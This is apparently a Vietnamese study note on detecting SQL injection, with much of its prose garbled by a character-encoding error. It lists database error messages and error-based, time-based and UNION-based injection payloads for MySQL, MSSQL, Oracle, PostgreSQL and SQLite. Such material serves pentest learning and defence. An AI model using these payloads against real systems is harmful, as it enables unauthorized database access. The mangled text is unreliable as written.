
1. C√°c ph√°t hi·ªán ƒë·ªëi v·ªõi m·ªói lo·∫°i db nh∆∞ ki·ªÉu SQL server th√¨ c√≥ d·∫•u hi·ªáu g√¨

2. Ngo√†i thu th·∫≠p d·ªØ li·ªáu t·ª´ db qua SQLi th√¨ c√≤n c√≥ th·ªÉ l√†m ƒë∆∞·ª£c g√¨ th√™m 

1. D·∫•u hi·ªáu chung ƒë·ªÉ ph√°t hi·ªán SQLi

·ª®ng d·ª•ng tr·∫£ v·ªÅ l·ªói SQL (error-based), v√≠ d·ª•:

MySQL: You have an error in your SQL syntax;

MSSQL: Unclosed quotation mark after the character string;

Oracle: ORA-00933: SQL command not properly ended

·ª®ng d·ª•ng tr·∫£ v·ªÅ k·∫øt qu·∫£ b·∫•t th∆∞·ªùng khi th√™m ' OR 1=1 --.

D·ªØ li·ªáu b·ªã l·ªçc ho·∫∑c thay ƒë·ªïi khi th√™m ', ", --, #, ;.

K·∫øt qu·∫£ tr·∫£ v·ªÅ ch·∫≠m b·∫•t th∆∞·ªùng khi d√πng payload ki·ªÉu Time-based (SLEEP(), WAITFOR DELAY, ‚Ä¶).

K·∫øt qu·∫£ thay ƒë·ªïi khi ch√®n payload Union-based (UNION SELECT NULL,...).

üóÑÔ∏è 2. Theo t·ª´ng lo·∫°i Database
2.1 MySQL

K√Ω t·ª± nh·∫°y c·∫£m: ', ", --, #, /* */

Ph√°t hi·ªán b·∫±ng l·ªói:

' OR '1'='1


‚Üí Th∆∞·ªùng b√°o l·ªói: You have an error in your SQL syntax.

Payload time-based:

' AND SLEEP(5) --+


Union-based test:

' UNION SELECT 1,2,3 --+

2.2 Microsoft SQL Server (MSSQL)

K√Ω t·ª± nh·∫°y c·∫£m: ', ", --, ;

L·ªói th∆∞·ªùng th·∫•y: Unclosed quotation mark after the character string.

Payload time-based:

' WAITFOR DELAY '0:0:5' --


Union test:

' UNION SELECT 1,@@version,db_name() --

2.3 Oracle

K√Ω t·ª± nh·∫°y c·∫£m: ', --, /* */

L·ªói th∆∞·ªùng: ORA-01756: quoted string not properly terminated

Payload time-based:

' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --


Union test (Oracle b·∫Øt bu·ªôc ph·∫£i FROM DUAL):

' UNION SELECT 'test' FROM DUAL --

2.4 PostgreSQL

K√Ω t·ª± nh·∫°y c·∫£m: ', --, /* */

L·ªói th∆∞·ªùng: syntax error at or near

Payload time-based:

' OR pg_sleep(5) --


Union test:

' UNION SELECT version(), current_database() --

2.5 SQLite

K√Ω t·ª± nh·∫°y c·∫£m: ', --, /* */

L·ªói th∆∞·ªùng: near "‚Ä¶" : syntax error

Payload test:

' OR 1=1 --


Time-based:

' OR randomblob(1000000000) --

